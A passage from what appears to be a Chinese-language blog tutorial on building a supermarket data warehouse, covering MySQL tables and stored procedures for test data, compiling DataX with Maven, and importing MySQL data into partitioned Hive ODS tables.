class="operator">=</span>innodb <span class="keyword">default</span> charset<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建超市分店信息表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> market_info(</span><br><span class="line">id <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">market_id <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;超市分店编号&#x27;</span>,</span><br><span class="line">market_address <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;超市分店地址&#x27;</span>,</span><br><span class="line">start_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;有效期起始时间&#x27;</span>,</span><br><span class="line">end_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;有效期终止时间&#x27;</span>,</span><br><span class="line">market_name <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;超市分店名称&#x27;</span>,</span><br><span class="line">create_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) engine<span class="operator">=</span>innodb <span class="keyword">default</span> charset<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">--创建清单记录表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sale_info( </span><br><span class="line">id <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">order_id <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;清单号&#x27;</span>,</span><br><span class="line">order_status <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;清单状态&#x27;</span>, </span><br><span class="line">market_id <span class="type">varchar</span>(<span class="number">100</span>) comment<span class="string">&#x27; 超市分店编号&#x27;</span>,</span><br><span class="line">product_num <span class="type">int</span> comment <span class="string">&#x27;商品数量&#x27;</span>,</span><br><span class="line">product_id <span class="type">int</span> comment <span class="string">&#x27;商品id&#x27;</span>,</span><br><span class="line">create_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">update_time <span class="type">varchar</span>(<span class="number">100</span>) comment <span class="string">&#x27;更新时间&#x27;</span></span><br><span class="line">) engine<span class="operator">=</span>innodb <span class="keyword">default</span> charset<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看到各个新建的三个表</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">|</span> market_info                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> product_info                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sale_info                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="number">77</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><h5 id="超市分店"><a href="#超市分店" class="headerlink" title="超市分店"></a>超市分店</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p </span><br><span class="line">use hive</span><br><span class="line"></span><br><span class="line">insert into market_info(market_id,market_address,start_time,end_time,market_name,create_time,update_time) values (&#x27;1000001&#x27;,&#x27;湖南省长沙市开福区万达广场1021号&#x27;,&#x27;2021-12-16&#x27;,&#x27;2028-12-17&#x27;,&#x27;大润发开福万达店&#x27;,&#x27;2021-12-12&#x27;,&#x27;2021-12-12&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">insert into market_info(market_id,market_address,start_time,end_time,market_name,create_time,update_time) values (&#x27;1000002&#x27;,&#x27;湖南省长沙市岳麓区万达广场1021号&#x27;,&#x27;2021-12-16&#x27;,&#x27;2028-12-17&#x27;,&#x27;大润发岳麓万达店&#x27;,&#x27;2021-12-12&#x27;,&#x27;2021-12-12&#x27;);</span><br><span class="line"></span><br><span class="line">insert into market_info(market_id,market_address,start_time,end_time,market_name,create_time,update_time) values (&#x27;1000003&#x27;,&#x27;湖南省长沙市雨花区万达广场1021号&#x27;,&#x27;2021-12-16&#x27;,&#x27;2028-12-16&#x27;,&#x27;大润发雨花万达店&#x27;,&#x27;2021-12-12&#x27;,&#x27;2021-12-12&#x27;);</span><br></pre></td></tr></table></figure>

<h5 id="商品表-存储过程"><a href="#商品表-存储过程" class="headerlink" title="商品表-存储过程"></a>商品表-存储过程</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p </span><br><span class="line">use hive</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> insert_product_info;</span><br><span class="line">delimiter <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> insert_product_info(type_name <span class="type">varchar</span>(<span class="number">100</span>),product_price <span class="type">varchar</span>(<span class="number">100</span>),start_time <span class="type">varchar</span>(<span class="number">100</span>),end_time <span class="type">varchar</span>(<span class="number">100</span>),create_time <span class="type">varchar</span>(<span class="number">100</span>),update_time <span class="type">varchar</span>(<span class="number">100</span>),num <span class="type">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> str <span class="type">char</span>(<span class="number">62</span>) <span class="keyword">default</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">declare</span> product_name <span class="type">char</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">declare</span> product_id <span class="type">int</span>;</span><br><span class="line"><span class="keyword">declare</span> i <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">while i<span class="operator">&lt;=</span> num DO</span><br><span class="line"><span class="comment">-- 生成商品名称随机数</span></span><br><span class="line"><span class="keyword">set</span> product_name<span class="operator">=</span>concat(&quot;商品名称&quot;,<span class="built_in">substring</span>(str,<span class="number">1</span><span class="operator">+</span><span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">61</span>),<span class="number">2</span>),<span class="built_in">substring</span>(str,<span class="number">1</span><span class="operator">+</span><span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">61</span>),<span class="number">3</span>));</span><br><span class="line"><span class="comment">-- 生成商品ID随机数</span></span><br><span class="line"><span class="keyword">set</span> product_id <span class="operator">=</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">1000</span>);</span><br><span class="line"><span class="keyword">set</span> i<span class="operator">=</span>i<span class="operator">+</span><span class="number">1</span>; </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `hive`.`product_info` (`product_id`, `type_name`, `supplier_phone`, `supplier_address`, `product_price`, `product_desc`, `start_time`, `end_time`, `product_name`, `create_time`, `update_time`) <span class="keyword">VALUES</span> (product_id, type_name, <span class="string">&#x27;18576759590&#x27;</span>, <span class="string">&#x27;湖南省常德市&#x27;</span>, product_price, <span class="string">&#x27;产品描述&#x27;</span>, start_time, end_time, product_name, create_time, update_time);</span><br><span class="line"><span class="keyword">end</span> while; </span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"># 下面这种方式调用，后面的<span class="number">100</span>就是插入<span class="number">100</span>条数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">call</span> insert_product_info(<span class="string">&#x27;食品&#x27;</span>,<span class="string">&#x27;50&#x27;</span>,<span class="string">&#x27;2021-12-16&#x27;</span>, <span class="string">&#x27;2022-12-17&#x27;</span>, <span class="string">&#x27;2021-12-15&#x27;</span>,<span class="string">&#x27;2021-12-15&#x27;</span>,<span class="number">100</span>) <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">call</span> insert_product_info(<span class="string">&#x27;酒水&#x27;</span>,<span class="string">&#x27;100&#x27;</span>,<span class="string">&#x27;2021-12-16&#x27;</span>, <span class="string">&#x27;2022-12-17&#x27;</span>, <span class="string">&#x27;2021-12-15&#x27;</span>,<span class="string">&#x27;2021-12-15&#x27;</span>,<span class="number">100</span>) <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"># 查询到各个插入成功的数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> product_info;<span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">202</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>数据列表</li>
</ul>
<p><img src="/aposts/bcb72660/image-20211217165223721.png" alt="image-20211217165223721"></p>
<h5 id="清单记录表-存储过程"><a href="#清单记录表-存储过程" class="headerlink" title="清单记录表-存储过程"></a>清单记录表-存储过程</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p </span><br><span class="line">use hive</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> insert_sale_info;</span><br><span class="line">delimiter <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> insert_sale_info(order_status <span class="type">varchar</span>(<span class="number">10</span>),market_id <span class="type">varchar</span>(<span class="number">100</span>),product_num <span class="type">int</span>,product_id <span class="type">int</span>,create_time <span class="type">varchar</span>(<span class="number">100</span>),update_time <span class="type">varchar</span>(<span class="number">100</span>),num <span class="type">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> order_id <span class="type">int</span>;</span><br><span class="line"><span class="keyword">declare</span> i <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">while i<span class="operator">&lt;=</span> num DO</span><br><span class="line"><span class="keyword">set</span> i<span class="operator">=</span>i<span class="operator">+</span><span class="number">1</span>; </span><br><span class="line"><span class="comment">-- 随机生成订单id</span></span><br><span class="line"><span class="keyword">set</span> order_id <span class="operator">=</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">100</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `hive`.`sale_info` (`order_id`, `order_status`, `market_id`, `product_num`, `product_id`, `create_time`, `update_time`) <span class="keyword">VALUES</span> (order_id, order_status, market_id, product_num, product_id, create_time, update_time);</span><br><span class="line"><span class="keyword">end</span> while; </span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"># 注意<span class="operator">/</span><span class="operator">/</span>这个分隔符，是区分存储过程的，调用存储过程注意market_id，product_id的值，要从相应的超市分店，商品信息表中找到对应数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">call</span> insert_sale_info(<span class="string">&#x27;待付款&#x27;</span>,<span class="string">&#x27;1000001&#x27;</span>,<span class="number">5</span>, <span class="number">221</span>,<span class="string">&#x27;2021-12-15&#x27;</span>,<span class="string">&#x27;2021-12-15&#x27;</span>,<span class="number">100</span>) <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">call</span> insert_sale_info(<span class="string">&#x27;已付款&#x27;</span>,<span class="string">&#x27;1000002&#x27;</span>,<span class="number">10</span>, <span class="number">182</span>, <span class="string">&#x27;2021-12-14&#x27;</span>,<span class="string">&#x27;2021-12-14&#x27;</span>,<span class="number">100</span>) <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"># 查询到刚刚插入的数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sale_info;<span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">203</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>数据列表如下</li>
</ul>
<p><img src="/aposts/bcb72660/image-20211217170539691.png" alt="image-20211217170539691"></p>
<h3 id="业务数据导入ODS-datax"><a href="#业务数据导入ODS-datax" class="headerlink" title="业务数据导入ODS-datax"></a>业务数据导入ODS-datax</h3><h4 id="datax-环境搭建"><a href="#datax-环境搭建" class="headerlink" title="datax 环境搭建"></a>datax 环境搭建</h4><ul>
<li>建议自己用源代码编译方式，比较稳妥</li>
<li>下载源文件解压</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/alibaba/DataX/archive/master.zip</span><br><span class="line">unzip DataX-master.zip </span><br></pre></td></tr></table></figure>

<ul>
<li>下载maven</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wget --no-check-certificate  https://dlcdn.apache.org/maven/maven-3/3.8.4/binaries/apache-maven-3.8.4-bin.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf apache-maven-3.8.4-bin.tar.gz</span><br><span class="line"><span class="comment"># 配置maven环境变量 </span></span><br><span class="line">vi /etc/profile </span><br><span class="line"></span><br><span class="line"> <span class="built_in">export</span> M2_HOME=/usr/local/apache-maven-3.8.4 //本地maven安装home目录</span><br><span class="line"> <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$M2_HOME</span>/bin</span><br><span class="line"> <span class="comment"># 生效环境变量设置</span></span><br><span class="line"> <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/bcb72660/image-20211221090119715.png" alt="image-20211221090119715"></p>
<ul>
<li>配置maven本地仓库,   进如本地maven安装目录里的conf目录，   <code>vi settings.xml</code>进行如下修改</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> -- 设置仓库地址</span><br><span class="line"> &lt;localRepository&gt;/usr/local/apache-maven-3.8.4/repo&lt;/localRepository&gt;</span><br><span class="line"> -- 设置阿里云镜像</span><br><span class="line">&lt;mirror&gt;</span><br><span class="line">  &lt;<span class="built_in">id</span>&gt;nexus-aliyun&lt;/id&gt;</span><br><span class="line">  &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">  &lt;name&gt;Nexus aliyun&lt;/name&gt;</span><br><span class="line">  &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>最后查看maven安装结果 maven -version</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos resp]# mvn -version</span><br><span class="line">Apache Maven 3.8.4 (9b656c72d54e5bacbed989b64718c159fe39b537)</span><br><span class="line">Maven home: /usr/local/apache-maven-3.8.4</span><br><span class="line">Java version: 1.8.0_311, vendor: Oracle Corporation, runtime: /usr/local/jdk1.8.0_311/jre</span><br><span class="line">Default locale: en_US, platform encoding: UTF-8</span><br><span class="line">OS name: &quot;linux&quot;, version: &quot;3.10.0-1160.11.1.el7.x86_64&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改datax的目录中的pom.xml中的内容</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mysql.driver.version</span>&gt;</span>8.0.26<span class="tag">&lt;/<span class="name">mysql.driver.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- reader --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>mysqlreader<span class="tag">&lt;/<span class="name">module</span>&gt;</span>      </span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>hdfsreader<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>streamreader<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- writer --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>mysqlwriter<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">module</span>&gt;</span>hdfswriter<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">module</span>&gt;</span>streamwriter<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- common support module --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">module</span>&gt;</span>plugin-rdbms-util<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">module</span>&gt;</span>plugin-unstructured-storage-util<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">module</span>&gt;</span>hbase20xsqlreader<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">module</span>&gt;</span>hbase20xsqlwriter<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">module</span>&gt;</span>kuduwriter<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>hdfswrite目录下面的pom.xml修改hive和hadoop版本</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hive.version</span>&gt;</span>3.1.2<span class="tag">&lt;/<span class="name">hive.version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hadoop.version</span>&gt;</span>3.0.3<span class="tag">&lt;/<span class="name">hadoop.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li>在 datax的目录执行编译命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn -U clean package assembly:assembly -Dmaven.test.skip=<span class="literal">true</span></span><br><span class="line">WARNING] Assembly file: /usr/local/DataX-master/target/datax is not a regular file (it may be a directory). It cannot be attached to the project build <span class="keyword">for</span> installation or deployment.</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Reactor Summary <span class="keyword">for</span> datax-all 0.0.1-SNAPSHOT:</span><br><span class="line">[INFO] kuduwriter ......................................... SUCCESS [  2.148 s]</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>把target目录中的datax.tar.gz移动到指定目录,解压</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos target]<span class="comment"># cp datax.tar.gz /usr/local/</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/</span><br><span class="line">tar -zxvf datax.tar.gz</span><br></pre></td></tr></table></figure>

<h5 id="数据超市导入ods表"><a href="#数据超市导入ods表" class="headerlink" title="数据超市导入ods表"></a>数据超市导入ods表</h5><ul>
<li><p>创建分区信息，手动创建分区路径</p>
</li>
<li><p>不过奇怪的是我用下面命令的方式创建，用datax导入报错找不到创建的分区</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hdfs dfs -<span class="built_in">mkdir</span> -p /user/hive/warehouse/hive.db/ods_market_info/dt=2021-12-21</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>用sql原生语句insert插入一条数据后</strong>，重新datax导入就成功了</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ods_market_info <span class="keyword">partition</span>(dt <span class="operator">=</span> <span class="string">&#x27;2021-12-21&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换用户</span></span><br><span class="line">su hadoop</span><br><span class="line"><span class="comment"># 进入到hive模式</span></span><br><span class="line">hive</span><br><span class="line"><span class="comment"># 使用hive数据库</span></span><br><span class="line">use hive;</span><br><span class="line"><span class="comment"># 手动插入分区信息内容</span></span><br><span class="line">hive&gt;insert into ods_market_info partition(dt = <span class="string">&#x27;2021-12-21&#x27;</span>) values (<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;222&#x27;</span>,<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;55&#x27;</span>,<span class="string">&#x27;66&#x27;</span>,<span class="string">&#x27;77&#x27;</span>);</span><br><span class="line"><span class="comment"># 查看到刚刚插入的信息</span></span><br><span class="line">hive&gt;select * from ods_market_info;</span><br><span class="line"><span class="comment"># 新增完后，可以删除表中数据，也可不删</span></span><br><span class="line">hive&gt;<span class="built_in">truncate</span> table ods_market_info;</span><br><span class="line">hive&gt;<span class="built_in">exit</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看到分区信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos root]$ hadoop fs -ls /user/hive/warehouse/hive.db/ods_market_info/</span><br><span class="line">drwxr-xr-x   - hadoop supergroup          0 2021-12-22 15:57 /user/hive/warehouse/hive.db/ods_market_info/dt=2021-12-21</span><br><span class="line">drwxr-xr-x   - hadoop supergroup          0 2021-12-22 15:57 /user/hive/warehouse/hive.db/ods_market_info/dt=2021-12-22</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在datax的job目录编写一个mysql_hive_ods_market_info.json文件，同步超市分店配置用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos job]<span class="comment"># ls</span></span><br><span class="line">job.json  mysql_hive_ods_market_info.json</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑mysql_hive_ods_market_info.json文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;job&quot;: &#123;</span><br><span class="line">		&quot;setting&quot;: &#123;</span><br><span class="line">			&quot;speed&quot;: &#123;</span><br><span class="line">				&quot;channel&quot;: 1</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;content&quot;: [&#123;</span><br><span class="line">			 &quot;reader&quot;: &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;mysqlreader&quot;,</span><br><span class="line">                    &quot;parameter&quot;: &#123;</span><br><span class="line">                        &quot;column&quot;: [</span><br><span class="line">                            &quot;market_id&quot;,</span><br><span class="line">							&quot;market_address&quot;,</span><br><span class="line">							&quot;start_time&quot;,</span><br><span class="line">							&quot;end_time&quot;,</span><br><span class="line">							&quot;market_name&quot;,</span><br><span class="line">							&quot;create_time&quot;,</span><br><span class="line">							&quot;update_time&quot;							</span><br><span class="line">                        ],</span><br><span class="line">                        &quot;connection&quot;: [</span><br><span class="line">                            &#123;</span><br><span class="line">                                &quot;jdbcUrl&quot;: [</span><br><span class="line">                                    &quot;jdbc:mysql://localhost:3306/hive&quot;</span><br><span class="line">                                ],</span><br><span class="line">                                &quot;table&quot;: [</span><br><span class="line">                                    &quot;market_info&quot;</span><br><span class="line">                                ]</span><br><span class="line">                            &#125;</span><br><span class="line">                        ],</span><br><span class="line">                        &quot;password&quot;: &quot;hive1234&quot;,</span><br><span class="line">                        &quot;username&quot;: &quot;hive&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line"></span><br><span class="line">			&quot;writer&quot;: &#123;</span><br><span class="line">				&quot;name&quot;: &quot;hdfswriter&quot;,</span><br><span class="line">				&quot;parameter&quot;: &#123;</span><br><span class="line">					&quot;defaultFS&quot;: &quot;hdfs://localhost:9000&quot;,</span><br><span class="line">					&quot;fileType&quot;: &quot;text&quot;,</span><br><span class="line">					&quot;path&quot;: &quot;/user/hive/warehouse/hive.db/ods_market_info/dt=2021-12-21&quot;,</span><br><span class="line">					&quot;fileName&quot;: &quot;ods_market_info&quot;,</span><br><span class="line">					&quot;column&quot;: [&#123;</span><br><span class="line">							&quot;name&quot;: &quot;market_id&quot;,</span><br><span class="line">							&quot;type&quot;: &quot;string&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&#123;</span><br><span class="line">							&quot;name&quot;: &quot;market_address&quot;,</span><br><span class="line">							&quot;type&quot;: &quot;string&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&#123;</span><br><span class="line">							&quot;name&quot;: &quot;start_time&quot;,</span><br><span class="line">							&quot;type&quot;: &quot;string&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&#123;</span><br><span class="line">							&quot;name&quot;: &quot;end_time&quot;,</span><br><span class="line">							&quot;type&quot;: &quot;string&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&#123;</span><br><span class="line">							&quot;name&quot;: &quot;market_name&quot;,</span><br><span class="line">							&quot;type&quot;: &quot;string&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&#123;</span><br><span class="line">							&quot;name&quot;: &quot;create_time&quot;,</span><br><span class="line">							&quot;type&quot;: &quot;string&quot;</span><br><span class="line">						&#125;,</span><br><span class="line">						&#123;</span><br><span class="line">							&quot;name&quot;: &quot;update_time&quot;,</span><br><span class="line">							&quot;type&quot;: &quot;string&quot;</span><br><span class="line">						&#125;</span><br><span class="line">					],</span><br><span class="line">					&quot;writeMode&quot;: &quot;append&quot;,</span><br><span class="line">					&quot;fieldDelimiter&quot;: &quot;\t&quot;,</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>hive&gt; show create table hive.ods_market_info;<br>…..<br>LOCATION<br>‘hdfs:&#x2F;&#x2F;localhost:9000&#x2F;user&#x2F;hive&#x2F;warehouse&#x2F;hive.db&#x2F;ods_market_info’<br>….</p>
<p>执行命令后在结果中可以看到LOCATOIN,就是hive在hdfs中的存储目录。填写到writer下的path中，dt就是刚刚创建的分区</p>
</blockquote>
</li>
<li><p>运行datax命令</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回到root用户</span><br><span class="line">[hadoop@VM-24-13-centos root]$ su</span><br><span class="line">[root@VM-24-13-centos ~]# cd /usr/local/datax/bin/</span><br><span class="line"># DHADOOP_USER_NAME一定要用hadoop用户，用其他用户会报错没有权限</span><br><span class="line">[root@VM-24-13-centos bin]# python datax.py -p &quot;-DHADOOP_USER_NAME=hadoop&quot; ../job/mysql_hive_ods_market_info.json</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/bcb72660/image-20211222172711034.png" alt="image-20211222172711034"></p>
<ul>
<li>查看hive中的超市表中是否有数据</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos bin]# su hadoop</span><br><span class="line">[hadoop@VM-24-13-centos bin]$ hive</span><br><span class="line"><span class="meta prompt_">hive&gt; </span><span class="language-bash">select * from hive.ods_market_info;</span></span><br><span class="line">000001 湖南省长沙市开福区万达广场1021号        2021-12-16 00:00:00     2028-12-16 23:59:59     大润发开福万达店        2021-12-12 16:00:00     2021-12-12 16:00:00   2021-12-21</span><br><span class="line">1000002 湖南省长沙市岳麓万达广场1021号  2021-12-16 00:00:00     2028-12-16 23:59:59     大润发岳麓万达店        2021-12-12 16:00:00     2021-12-12 16:00:00  2021-12-21</span><br></pre></td></tr></table></figure>

